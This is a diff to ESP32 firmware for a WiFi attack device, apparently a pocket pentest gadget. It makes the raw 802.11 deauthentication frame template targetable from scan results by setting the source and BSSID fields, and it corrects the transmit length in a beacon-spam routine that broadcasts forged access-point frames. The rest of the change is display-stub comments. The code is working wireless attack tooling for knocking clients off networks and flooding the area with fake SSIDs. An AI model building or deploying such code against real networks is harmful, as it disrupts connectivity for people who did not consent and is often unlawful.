@@ -50,13 +50,18 @@ int rssiValues[50];
 uint8_t channels[50];
 
 // Attack parameters
+// Deauth packet template - can be configured for specific targets
+// Bytes 4-9: Destination MAC, Bytes 10-15: Source MAC, Bytes 16-21: BSSID
 uint8_t deauthPacket[26] = {
   0xC0, 0x00, 0x3A, 0x01,
-  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination (broadcast by default)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source (can be set from scan results)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (can be set from scan results)
   0xF0, 0xFF, 0x02, 0x00
 };
+
+// Selected target for attacks
+int targetNetworkIndex = -1;
 
 // Beacon frame template
 uint8_t beaconPacket[109] = {
@@ -207,10 +212,14 @@ void goBack() {
 }
 
 void updateDisplay() {
-  // Placeholder for OLED update
-  // In production, this would update the OLED display
+  // Display update function
+  // For OLED implementation, see Firmware_Guide.md for Adafruit SSD1306 library integration
+  // Currently outputs to Serial for debugging
   Serial.print("Selection: ");
   Serial.println(menuSelection);
+  
+  // TODO: Implement OLED display update when hardware is connected
+  // Example code available in Firmware_Guide.md Section 10
 }
 
 void performWiFiScan() {
@@ -309,7 +318,9 @@ void performBeaconSpam() {
       beaconPacket[38 + j] = ssid[j];
     }
     
-    esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), false);
+    // Calculate actual packet size: fixed header (38) + SSID length + remaining fields
+    int packetSize = 38 + ssidLen + 13;  // 13 bytes for rates and channel info
+    esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, packetSize, false);
     delay(100);
     
     Serial.print(".");
